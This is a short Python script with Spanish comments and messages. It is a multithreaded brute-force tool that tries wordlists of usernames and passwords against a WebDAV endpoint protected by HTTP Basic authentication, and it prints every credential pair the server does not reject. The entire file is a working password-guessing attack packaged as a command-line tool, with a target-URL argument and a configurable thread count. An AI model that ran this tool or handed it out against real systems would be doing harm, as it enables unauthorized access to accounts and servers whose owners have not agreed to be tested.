import requests, base64, argparse, sys, os
from concurrent.futures import ThreadPoolExecutor
from threading import Lock

state = False
print_lock = Lock()
credentials = {}

def brute_force(url, user, password):
    global state
    payload = f'{user}:{password}'.encode('utf-8')

    header = {'Authorization': f"Basic {base64.b64encode(payload).decode('utf-8')}"}

    r = requests.get(url=url, headers=header, proxies={'http://':'http://127.0.0.1:8080'})

    with print_lock:
        print(f'[INFO] Probando credenciales: {user}:{password}')
        if r.status_code == 401:
            return False
        
        state = True
        print(f'\033[1;32m[+] OJO: {user}:{password}')
        return True

def main(target, usernames, passwords, workers):
    check_url = lambda url: url[:-1] if url[-1] == '/' else url
    url = check_url(url=target)

    if url.split('/')[-1] != 'webdav':
        print('[-] La URL objetivo debe de terminar en el directorio "webdav"')
        sys.exit(1)

    with open(usernames, 'r', encoding='latin-1') as u, open(passwords, 'r', encoding='latin-1') as p:
        user_list = [user.strip() for user in u]
        password_list = [password.strip() for password in p]

    try:
        with ThreadPoolExecutor(max_workers=workers) as executor:
            for user in user_list:
                if state: break
                for password in password_list:
                    executor.submit(brute_force, url, user, password)
    except KeyboardInterrupt:
        with print_lock:
            print('[INFO] Saliendo del programa...')
            os._exit(0)


if __name__=="__main__":
    parser = argparse.ArgumentParser(description='Herramienta de fuerza bruta para basic authentication')

    parser.add_argument('-t', '--target', required=True,
                        help='URL a atacar')
    parser.add_argument('-u', '--usernames', required=True,
                        help='Lista de usuarios')
    parser.add_argument('-p', '--passwords', required=True,
                        help='Lista de contrasenas')
    parser.add_argument('-w', '--workers', type=int, default=10,
                        help='Numero de hilos')
    
    args = parser.parse_args()

    main(args.target,args.usernames,args.passwords,args.workers)
